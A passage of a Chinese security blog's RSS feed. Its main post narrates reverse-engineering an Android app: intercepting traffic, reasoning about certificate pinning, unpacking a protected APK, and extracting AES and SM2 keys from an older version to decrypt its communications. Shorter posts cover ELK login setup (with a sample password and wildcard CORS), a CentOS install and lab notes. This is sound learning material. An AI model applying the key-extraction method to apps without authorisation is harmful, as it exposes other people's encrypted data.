抓包工具</h2><table><thead><tr><th>工具名称</th><th>使用平台</th><th>抓包类型</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>Wireshark</td><td>linux、windows</td><td>网络7层协议</td><td>linux平台支持好,功能强大，可抓网络7层的包</td><td>不能解析https的内容</td></tr><tr><td>Fidder</td><td>windows</td><td>http，https 和FTP协议</td><td>功能强大，支持修改报文，重放报文</td><td>仅支持windows</td></tr><tr><td>Charles</td><td>window、Mac</td><td>http,socket</td><td>可以按照域名进行分层级查看</td><td>需要收费</td></tr><tr><td>BurpSuite</td><td>支持java的平台</td><td>http,https</td><td>黑客喜欢用的功能强大工具，可以重放包，篡改包等进行一些包的攻击。</td><td>界面不是很好看</td></tr><tr><td>HttpCanary</td><td>Android</td><td>http,https，WebSocket</td><td>使用方便</td><td>只支持Android</td></tr></tbody></table><p>手机只能安装crt证书</p><h2 id="1-2-反汇编工具"><a href="#1-2-反汇编工具" class="headerlink" title="1.2 反汇编工具"></a>1.2 反汇编工具</h2><table><thead><tr><th>描述</th><th>所需要软件</th><th>步骤</th><th>优缺点</th></tr></thead><tbody><tr><td>较老一套</td><td>dex2jar:将dex转化成jar<br>JD-GUI : 反编译jar中的源码 <br>apktool.jar</td><td><a href="https://blog.csdn.net/qq_33721320/article/details/83413283">Android反编译apk逆向分析</a></td><td>使用复杂</td></tr><tr><td>上面工具的封装</td><td>AndroidKiller_v1.3.1</td><td><a href="https://wizardforcel.gitbooks.io/fl-android-re-tut/content/3.1.html">AndroidKiller教程</a></td><td>使用复杂</td></tr><tr><td>强大</td><td>jadx</td><td>直接拖apk到即可</td><td>使用方便</td></tr></tbody></table><h2 id="1-3-查壳工具："><a href="#1-3-查壳工具：" class="headerlink" title="1.3 查壳工具："></a>1.3 查壳工具：</h2><p>ApkScan</p><h2 id="1-4-脱壳工具："><a href="#1-4-脱壳工具：" class="headerlink" title="1.4 脱壳工具："></a>1.4 脱壳工具：</h2><p>反射大师，FDEX等</p><h1 id="2-逆向过程"><a href="#2-逆向过程" class="headerlink" title="2 逆向过程"></a>2 逆向过程</h1><p>·文章废话比较多，为了使各位看客看的明白，先抛出整个爬坑过程：<strong>抓包–》反汇编–》脱壳–》拿到私钥</strong></p><h2 id="2-1-抓包"><a href="#2-1-抓包" class="headerlink" title="2.1 抓包"></a>2.1 抓包</h2><p>话说回来，老大说fiddler抓包失败，于是乎，从网上下载fillder，用我的oppo手机装上证书，开始了第一次fiddler抓包之旅，网上随手找一篇<a href="https://www.jianshu.com/p/5a353e164e7c">抓包攻略</a>，发现连接失败，（这里有个坑：公司网络刚好不可以访问这个app，开始弄了好久，都是0字节，后面换了自己热点，就出现连接失败，说到这里真的想吐槽公司网络）</p><p>接着用我最熟悉的burpsuite抓包，发现抓不了https的包，证书也安装了呀，其他https请求都可以抓，刚开始以为是证书的问题，并且app，始终报错，证书校验错误，让我更加以为是证书的问题。。但是又没办法解决，，就想着再换个抓包工具，charls抓包后send成功，但是response都失败了。</p><p>这时候打开微信问问我以前实验室的大佬，听说现在搞app逆向，他推荐了一款手机抓包神器httpCanary，直接安装到手机，抓包是超级方便呀，但是令人奔溃的是app依旧报错，证书校验错误，到这里内心很奔溃，开始网上搜，抓包失败，发现了这篇文章<a href="https://www.cnblogs.com/magicalpig/p/12671559.html">部分APP使用burpsuite抓不到包原因</a>，猜测可能app使用了双向认证或SSL-pinning(证书绑定) ，并谷歌这两个词汇，理解如下：</p><p><strong>单向认证：</strong>一般的客户端所作的都是单向认证，即客户端只需要验证服务器端的证书，确保服务器来源的可靠性，服务器端无需验证客户端证书。</p><p><strong>双向认证：</strong>客户端验证服务器端证书，服务器端也需要验证客户端证书。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602240311892.png" alt="1602240311892"></p><p><a href="https://zhuanlan.zhihu.com/p/58204817"><strong>SSL-pinning(证书绑定)：</strong></a></p><p><img src="/2020/09/18/mobilesecurity-experience/1602298885190.png" alt="1602298885190"></p><p>如上图所示： 证书锁定（SSL/TLS Pinning）提供了两种绑定方式： Certificate Pinning 和 Public Key Pinning，过程如下：</p><p>1）：首先对服务器端证书/证书中的公钥进行哈希，得到ssl指纹内置到app中。</p><p>2）：通信连接时，服务器发来证书。</p><p>3）：app对该证书进行哈希操作，将哈希值与app内置的ssl指纹进行对比，若对比成功，则建立连接，否则，断开连接。</p><p>弄懂双向认证和ssl-pinning原理后，结合中间人攻击原理（如下图），进行猜想如下：</p><p>1）如果该app使用的双向认证，即同时认证客户端证书，则在下图中间人与服务器端的交互中，中间人需要提供app的证书。客户端与中间人交互正常。</p><p>2）如果该app使用的是ssl-pinning，即客户端需要对服务器证书进行校验，则在下图客户端与中间人交互中，中间人的需要提供原有服务器端的证书。中间人与服务器端交互正常。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602299413602.png" alt="1602299413602"></p><p>无论是app证书还是服务器端证书，女生第六感觉得app中可能会有，因此下一步想着逆向app，看下app里面有没有证书啥的，然后代理绑定原有证书就可以正常抓包了。（后面发现我是有多天真）</p><h2 id="2-2-反汇编"><a href="#2-2-反汇编" class="headerlink" title="2.2 反汇编"></a>2.2 反汇编</h2><p>开始网上搜索apk反汇编教程，搜到了一篇超详细利用四件套反汇编apk教程，<a href="https://blog.csdn.net/qq_33721320/article/details/83413283">Android反编译apk逆向分析</a> ,按照他的步骤，先解压apk，查看解压后的文件发现了几个证书，一个后缀为cer的证书（看到这个证书个人感觉app应该用了双向认证吧，当时我愚蠢的以为这个证书即是服务器证书，也是客户端证书，因此下一步目标明确为：代理安装客户端证书即可），一个后缀为bks的deb_keystore.bks（这个时候我还不知道bks是啥）。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602311148129.png" alt="1602311148129"></p><p>下一步目标为中间人代理安装app客户端证书，我常用的工具为burpsuite，发现其可以导入客户端证书，在user options-&gt;ssl-Clinet ssl certificates下：<img src="/2020/09/18/mobilesecurity-experience/1602312160658.png" alt="1602312160658"></p><p>后面发现burp suite只可导入pem类型的证书，且需要输入密码，这时候我天真的以为密码可以读取反汇编后的源码中找，然后将可以将cer证书转为pem 证书，就可以成功导入客户端证书。但是反汇编后的dex源码可读性很差，并没有得到有用的东西，又看看cer证书转为pem证书格式，发现需要私钥，哎，这个时候打开微信，找找以前实验室的大佬，有没有好的反汇编工具推荐（这个时候一直以为反汇编工具不行），大佬推荐了jadx神器，直接拖拉apk即可，但是反汇编出的代码可读性仍然不太高，并没有有用的信息。但是收获了，不同格式证书的区别，<a href>总结在此</a>。于是又开始不断地谷歌，能否绕过ssl pinning(此时我也不确定是不是用了证书绑定还是双向认证，但是总得做点啥吧)，网上绕过ssl pinning需要 JustTrustMe，root手机啥的，我这刚买的oppo，也不能root呀，变搬砖了没钱买呀。尝试用模拟器呢，这个app简直了，首先尝试强大的夜神模拟器，app打开没反应，接着逍遥模拟器失败，mumu模拟器失败，天天模拟器失败，哎筋疲力尽的一天··········出去上了个厕所透透气 回来，app到底是不是用了ssl pining?或者双向认证？？？于是用httpCanary重新抓包详细看看了，这个时候突然有了重大发现，httpCanary抓包失败，有报错信息如下：</p><p><img src="/2020/09/18/mobilesecurity-experience/1602315130773.png" alt="1602315130773"></p><p>抓包失败因为Android 7.0以上，系统就不会信任安装用户的证书，也就是说，android不信任装的httpCanary根证书，当app进行交互时，没有可信任的根证书，因此交互失败。从下图的流程图可以看到，如果根证书可信，才会去判断该证书是否校验成功（ssl pinning/双向认证成功），因此，该app可能没有做双向认证或者ssl pinning，做没做找个android 7.0以下的手机试试就知道了。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602316415405.png" alt="1602316415405"></p><p>第二天，从家里拿了个之前的老手机，android 6.0系统的，安装httpcanary抓包，安装目标app，进行登录，突然发现旧手机的触屏有问题，刚好按密码那块失灵了<del>我的天啊</del>··真的命途多舛，<del>·后面灵机一动，可以放大屏幕，移动到触屏好的区域输入即可（我可真是个小机灵鬼）</del>果然抓包成功！！！1喜大普奔啊啊啊啊<del>·昨天一天我是在搞啥呀</del>····</p><p>然后贼开心的去找老大，说可以抓到包了，老大说通信内容可以解密么？需要看通信数据。分析下报文发现：</p><p>客户端app发送给服务器端用的是sm2密文(客户端存sm2公钥加密，服务器端存私钥解密)，服务器端发送给客户端app的是AES密文（客户端和服务器端都存有AES对称密钥），即使逆向app，也只能发现AES密钥，sm2密钥存在服务器端，哎找到一个是一个吧，然后又开始漫漫长路~·…..</p><h2 id="2-3-脱壳"><a href="#2-3-脱壳" class="headerlink" title="2.3 脱壳"></a>2.3 脱壳</h2><p>之前反汇编的源码都没啥结果，又谷歌发现app是不是加了壳，做了代码混淆啥的，于是网上下载了查壳工具ApkScan，果然发现该app加了阿里聚安全的壳。然后在旧手机上开始了一系列脱壳之旅：</p><p>（1）首先使用网上教程<a href="https://www.jianshu.com/p/dbe579f6cc84">脱壳工具FDex2</a>,进行脱壳，（旧手机手机安装 VirtualXposed，FDex2+total conmander（自带amaze文件管理器下载打开失败）），但是并没有在data/data目录文件夹中看到dex文件，脱壳失败。</p><p>（2）然后使用网上超牛的反射大师进行脱壳，<a href="https://blog.csdn.net/qq_41855420/article/details/106276824">利用反射大师超详细脱壳教程</a>，使用反射大师3.0，3.5版本，脱壳后有5个dex文件，但是源码可读性还是较差，没有找到有用代码，感觉脱壳还是失败。</p><p>（3）尝试其他脱壳工具，。。都一一失败<del>···一无所获</del>·不知所向~···</p><p>就这样又一天过去了~····回家睡觉</p><p>第三天换了清醒的脑袋，开始查看别人的脱壳经历，逆向app经历，突然发现一篇有趣的文章：<a href="https://zhuanlan.zhihu.com/p/60392573">为了抓包某app,我折腾了10天,原来他是用SSL Pinning防抓包的</a>，看到楼主的经历，我内心也好过多了，翻看评论时候，看到有个读者提问密钥是怎么获取的，楼主说从低版本获取，这可是个重要信息呀。我立刻从网上下载了低版本，利用反射大师一顿操作猛如虎，逆向出8个dex文件，有7M,9M的，心想这下有希望了，果然逐个打开dex搜索AES，惊喜发现AES密钥：果然利用在线AES解密成功。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602320940221.png" alt="1602320940221"></p><p>再搜索sm2_encrypt，发现sm2公钥和疑似sm2私钥（我的天，猜测app工程师用于测试忘记删除了）</p><p><img src="/2020/09/18/mobilesecurity-experience/1602321152209.png" alt="1602321152209"></p><p>将dex转为jar，IDE导入该库文件，调用apk中的sm2加解密函数，成功解密出交互密文！！</p><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h1><p>头秃的三天终于结束了！！只是一个记录小白逆向app的心酸过程，总结三点如下：</p><p>（1）逆向低版本app，这个真的是太重要了</p><p>（2） 安卓模拟器运行app失败后，最好用Android7.0以下进行测试。</p><p>（ 3）要有一个强大的内心和一直转的脑子<del>搞不动了可以换换方向，说不定柳暗花明又一村呢</del>···</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>1 <a href="https://www.cnblogs.com/magicalpig/p/12671559.html">部分APP使用burpsuite抓不到包原因</a>    </p><p>2 <a href="https://zhuanlan.zhihu.com/p/58204817">证书锁定SSL Pinning简介及用途</a>  </p><p>3 <a href="https://crifan.github.io/app_capture_package_tool_charles/website/appendix/reference.html"> 破解https的SSL Pinning</a>   很详细</p><p>4 <a href="https://www.cnblogs.com/mysticbinary/p/11609825.html">Androidkiller反汇编失败的解决方案</a>  能不用就不用，太复杂啦</p><p>5 <a href="http://dashy.cn/2020/01/11/%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%BA%92%E8%BD%AC/">证书格式互转</a>  很nice 虽然我没用到</p><p>6 <a href="https://www.jianshu.com/p/dbe579f6cc84">脱壳工具FDex2</a>   很详细  但是 Amaze 文件管理器下载打开失败，尝试用<a href="https://blog.csdn.net/weixin_36001685/article/details/101020843">total conmander</a>成功</p><p>7 <a href="https://blog.csdn.net/qq_41855420/article/details/106276824">利用反射大师超详细脱壳教程</a>   很nice，</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</category>
      
      
      <comments>https://m01ly.github.io/2020/09/18/mobilesecurity-experience/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>elk笔记二--通过X-Pack权限控制设置elk登录</title>
      <link>https://m01ly.github.io/2020/09/11/elk-login/</link>
      <guid>https://m01ly.github.io/2020/09/11/elk-login/</guid>
      <pubDate>Fri, 11 Sep 2020 09:59:18 GMT</pubDate>
      
      <description>&lt;p&gt; 给ES和kibana设置用户登陆，或者使用nginx限制IP或用户访问。本文介绍ELK自带的创建用户的方式。 首先贴了张网上的图可以看到ELK架构使用图。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p> 给ES和kibana设置用户登陆，或者使用nginx限制IP或用户访问。本文介绍ELK自带的创建用户的方式。 首先贴了张网上的图可以看到ELK架构使用图。<a id="more"></a></p><p><img src="https://images2018.cnblogs.com/blog/790307/201803/790307-20180313090706209-1391916396.jpg" alt="img"></p><h1 id="1-修改ES配置开启X-PACK"><a href="#1-修改ES配置开启X-PACK" class="headerlink" title="1 修改ES配置开启X-PACK"></a>1 修改ES配置开启X-PACK</h1><p>修改配置文件elasticsearch.yml内容如下：</p><p>ELK菜鸟手记 (三) - X-Pack权限控制之给Kibana加上登录控制以及index_not_found_exception问题解决</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vi /etc/elasticsearch/elasticsearch.yml</span>http.cors.enabled: <span class="token boolean">true</span>http.cors.allow-origin: <span class="token string">"*"</span>http.cors.allow-headers: Authorizationxpack.security.enabled: <span class="token boolean">true</span>xpack.security.transport.ssl.enabled: <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/elk-login/1603957755321.png" alt="1603957755321"></p><p>重启ES：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 elasticsearch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl restart elasticsearch</span><span class="token punctuation">[</span>root@ids0001 elasticsearch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl status elasticsearch</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="2-创建用户"><a href="#2-创建用户" class="headerlink" title="2 创建用户"></a>2 创建用户</h1><p>输入下列命令后，一次输入各个账户的密码：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd /usr/share/elasticsearch</span><span class="token punctuation">[</span>root@ids0001 elasticsearch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># bin/elasticsearch-setup-passwords interactive</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>内置账户的含义：<br> elastic内置超级用户。请参阅内置角色。<br> kibana用户Kibana用于连接Elasticsearch并与之通信。<br> logstash_system:Logstash用户在Elasticsearch中存储监视信息时使用。<br> beats_system:eats在Elasticsearch中存储监控信息时使用的用户。<br> apm_system:APM服务器在Elasticsearch中存储监视信息时使用的用户。<br> remote_monitoring_user:Metricbeat用户在Elasticsearch中收集和存储监控信息时使用。它具有remote_monitoring_agent和 remote_monitoring_collector内置的角色。</p><p><img src="/2020/09/11/elk-login/1603958077193.png" alt="1603958077193"></p><h1 id="3-修改Kibana配置"><a href="#3-修改Kibana配置" class="headerlink" title="3 修改Kibana配置"></a>3 修改Kibana配置</h1><p>vi /etc/kibana/kibana.yml </p><pre class="line-numbers language-bash"><code class="language-bash">elasticsearch.username: <span class="token string">"kibana_system"</span>elasticsearch.password: <span class="token string">"kibana*2020"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>重启Kibana</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl restart kibana</span><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl status kibana</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="4-修改logstash配置"><a href="#4-修改logstash配置" class="headerlink" title="4  修改logstash配置"></a>4  修改logstash配置</h1><p>3  配置logstash</p><p>vi /etc/logstash/conf.d/logstash.conf</p><p><img src="/2020/09/11/elk-login/1603959501523.png" alt="1603959501523"></p><p>重启logstash</p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="5登录"><a href="#5登录" class="headerlink" title="5登录"></a>5登录</h1><h2 id="5-1-登陆elasticsearch"><a href="#5-1-登陆elasticsearch" class="headerlink" title="5.1 登陆elasticsearch"></a>5.1 登陆elasticsearch</h2><p><img src="/2020/09/11/elk-login/1603959003797.png" alt="1603959003797"></p><h2 id="5-2-登陆kibana使用elasticsearch"><a href="#5-2-登陆kibana使用elasticsearch" class="headerlink" title="5.2 登陆kibana使用elasticsearch"></a>5.2 登陆kibana使用elasticsearch</h2><p>输入用户名：elastic和logstash.conf中的密码，</p><p><img src="/2020/09/11/elk-login/1603958930073.png" alt="1603958930073"></p><p><img src="/2020/09/11/elk-login/1603974376447.png" alt="1603974376447"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/wsdc0521/article/details/106344974">ELK系列(九)、配置ES和Kibana的用户密码</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/">日志管理</category>
      
      
      <comments>https://m01ly.github.io/2020/09/11/elk-login/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>vm 安装centos 7教程详解</title>
      <link>https://m01ly.github.io/2020/09/11/install-guide-centosInvm/</link>
      <guid>https://m01ly.github.io/2020/09/11/install-guide-centosInvm/</guid>
      <pubDate>Fri, 11 Sep 2020 09:59:18 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;1-前期准备&quot;&gt;&lt;a href=&quot;#1-前期准备&quot; class=&quot;headerlink&quot; title=&quot;1 前期准备&quot;&gt;&lt;/a&gt;1 前期准备&lt;/h1&gt;&lt;p&gt;1）VMware虚拟机&lt;/p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;centos镜像，我用的是centos7&lt;/li&gt;
&lt;/ol&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1 前期准备"></a>1 前期准备</h1><p>1）VMware虚拟机</p><ol start="2"><li>centos镜像，我用的是centos7</li></ol><a id="more"></a><p>官网下载地址：</p><p> <a href="http://isoredirect.centos.org/centos/">http://isoredirect.centos.org/centos/</a> 或者 <a href="http://apache.apooloo.cn/#/down/b6cfbd0dfda13a7f46125288e8ea8831">http://apache.apooloo.cn/#/down/b6cfbd0dfda13a7f46125288e8ea8831</a> </p><p><img src="/2020/09/11/install-guide-centosInvm/1603246800490.png" alt="1603246800490"></p><h1 id="2-新建虚拟机"><a href="#2-新建虚拟机" class="headerlink" title="2 新建虚拟机"></a>2 新建虚拟机</h1><p>（1）新建虚拟机</p><p><img src="/2020/09/11/install-guide-centosInvm/1603246938246.png" alt="1603246938246"></p><p>（2）选择自定义虚拟机</p><p><img src="/2020/09/11/install-guide-centosInvm/1603246969975.png" alt="1603246969975"></p><p>（3）兼容性选择</p><p>选择当前虚拟机版本就可，尽量选择高版本，因为高版本虚拟机可以兼容低版本创建的虚拟机。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247049675.png" alt="1603247049675"></p><p>（4）</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247121052.png" alt="1603247121052"></p><p>（5） 选择Linux的centos7,根据自己下载的镜像属性来选择</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247200778.png" alt="1603247200778"></p><p>（6）填写虚拟机名称和虚拟机所在位置</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247257115.png" alt="1603247257115"></p><p>（7）根据自己需求分配处理器和内核数量，因为有的软件安装需要双核的，因此我选了1个处理器，双核。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247301706.png" alt="1603247301706"></p><p>（8）我宿主机是8G的，给虚拟机分配了2G，1G内存会很卡，建议条件允许下分配2G。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247443067.png" alt="1603247443067"></p><p>（9）网络连接类型的选择，网络连接类型一共有桥接、NAT、仅主机和不联网四种。</p><p>桥接：选择桥接模式的话虚拟机和宿主机在网络上就是平级的关系，相当于连接在同一交换机上。</p><p>NAT：NAT模式就是虚拟机要联网得先通过宿主机才能和外面进行通信。</p><p>仅主机：虚拟机与宿主机直接连起来</p><p>桥接与NAT模式访问互联网过程，如下图所示</p><p><img src="https://img-blog.csdn.net/20180711224004659?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><p>这里选择NAT模式：</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249663181.png" alt="1603249663181"></p><p>（10）默认SCSI控制器即可，然后一直默认往下</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247594330.png" alt="1603247594330"></p><p>（11）创建新的虚拟机</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247633971.png" alt="1603247633971"></p><p>（12）分配磁盘，新手建议选择单个磁盘即可，满足需求又方便</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247698163.png" alt="1603247698163"></p><p>（13）取消不需要的硬件，若不需要，可以移除声卡等硬件</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247759405.png" alt="1603247759405"></p><p>（14）完成配置</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247816395.png" alt="1603247816395"></p><h1 id="3-安装配置centos"><a href="#3-安装配置centos" class="headerlink" title="3 安装配置centos"></a>3 安装配置centos</h1><p>（1）导入centos镜像，选中创建的虚拟机，右击，选择设置</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247903884.png" alt="1603247903884"></p><p>选择CD/DVD，然后使用ISO映像文件，导入官网下载的iso镜像，然后选择确定。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248005710.png" alt="1603248005710"></p><p>（2） 开启虚拟机</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248058638.png" alt="1603248058638"></p><p>（3）开启虚拟机后会出现以下界面</p><ol><li>Install CentOS 7 安装CentOS 7</li><li>Test this media &amp; install CentOS 7 测试安装文件并安装CentOS 7</li><li>Troubleshooting 修复故障</li></ol><p>选择第一项，安装直接CentOS 7，回车，进入下面的界面</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248982709.png" alt="1603248982709"></p><p>（4）选择语言， 英文、键盘选择美式键盘 ,点击continue</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248188656.png" alt="1603248188656"></p><p>(5)进入设置面板，首先设置时间，点击进行DATE&amp;TIME</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248238624.png" alt="1603248238624"></p><p>选择Asia区域，城市为上海，调节时间和日期如下，然后选择左上角的done</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248344446.png" alt="1603248344446"></p><p>（6）返回设置面板后，选择需要安装的软件;</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248414811.png" alt="1603248414811"></p><p>为了后面的虚拟机使用方便，选择了图像化界面，然后选择了几个组件，点击左上角done即可，如下：</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248586590.png" alt="1603248586590"></p><p>（7）返回面板，进行磁盘划分</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248642104.png" alt="1603248642104"></p><p>因为我们开始设置的是单个磁盘，这里直接选择默认的即可，点击done。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248690126.png" alt="1603248690126"></p><p>（8）返回设置面板，设置主机名和网卡信息</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248829613.png" alt="1603248829613"></p><p>首先设置网卡，打开，看到IP地址（看不到IP地址的应该是选择了桥接模式，前面一定要选择NAT模式），然后输入主机名，点击Apply，设置完成后，点击左上角DOne。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603250501053.png" alt="1603250501053"></p><p>（9）回到设置面板，点击右下角的begin installation，开始安装</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248731326.png" alt="1603248731326"></p><p>（10）设置root密码：</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249251084.png" alt="1603249251084"></p><p><img src="/2020/09/11/install-guide-centosInvm/1603249273725.png" alt="1603249273725"></p><p>（11）还可以设置管理员用户</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249382172.png" alt="1603249382172"></p><p>输入相关用户名密码，点击左上角done即可。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249407944.png" alt="1603249407944"></p><p>等待系统安装完毕重启系统即可。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249729806.png" alt="1603249729806"></p><h1 id="4-常见网络配置"><a href="#4-常见网络配置" class="headerlink" title="4 常见网络配置"></a>4 常见网络配置</h1><p>REF：</p><p><a href="https://blog.csdn.net/babyxue/article/details/80970526">超级详细的安装教程</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/">安装教程</category>
      
      
      <comments>https://m01ly.github.io/2020/09/11/install-guide-centosInvm/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>writeup-sqli-labs</title>
      <link>https://m01ly.github.io/2020/09/11/writeup-sqli-labs/</link>
      <guid>https://m01ly.github.io/2020/09/11/writeup-sqli-labs/</guid>
      <pubDate>Fri, 11 Sep 2020 09:59:18 GMT</pubDate>
      
      <description>&lt;p&gt;待完善&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>待完善</p><a id="more"></a><h1 id="1-sqli-labs安装"><a href="#1-sqli-labs安装" class="headerlink" title="1 sqli-labs安装"></a>1 sqli-labs安装</h1><p>因为XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。这个软件包原来的名字是 LAMPP，但是为了避免误解，最新的几个版本就改名为 XAMPP 了。它可以在Windows、<a href="https://baike.baidu.com/item/Linux">Linux</a>、Solaris、Mac OS X 等多种操作系统下安装使用。</p><p>因此我是打算在windows平台安装 XAMPP即可运行sqli-labs，下载地址如下：</p><p><a href="https://www.apachefriends.org/zh_cn/download.html">https://www.apachefriends.org/zh_cn/download.html</a></p><p>启动xampp,start Apache,无法启动的可能是相关端口占用，解决办法如下：</p><p><a href="https://blog.csdn.net/caizhigui/article/details/50332995">https://blog.csdn.net/caizhigui/article/details/50332995</a></p><p>sqli-labs源码地址：</p><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E9%9D%B6%E5%9C%BAwriteup/">靶场writeup</category>
      
      
      <comments>https://m01ly.github.io/2020/09/11/writeup-sqli-labs/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>elk笔记一---suricata+elk搭建入侵检测系统</title>
      <link>https://m01ly.github.io/2020/09/11/install-guide-elk-suricata/</link>
      <guid>https://m01ly.github.io/2020/09/11/install-guide-elk-suricata/</guid>
      <pubDate>Fri, 11 Sep 2020 09:59:18 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;1-引言&quot;&gt;&lt;a href=&quot;#1-引言&quot; class=&quot;headerlink&quot; title=&quot;1 引言&quot;&gt;&lt;/a&gt;1 引言&lt;/h1&gt;&lt;p&gt;最近有一个工作任务，需要利用Suricata作为IDS来检测出口流量，同时利用ELK进行数据的展示。看了很多suricata+elk进行流量监测的文章，但是都不太符合要求。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1 引言"></a>1 引言</h1><p>最近有一个工作任务，需要利用Suricata作为IDS来检测出口流量，同时利用ELK进行数据的展示。看了很多suricata+elk进行流量监测的文章，但是都不太符合要求。</p><a id="more"></a><h1 id="2-部署架构"><a href="#2-部署架构" class="headerlink" title="2 部署架构"></a>2 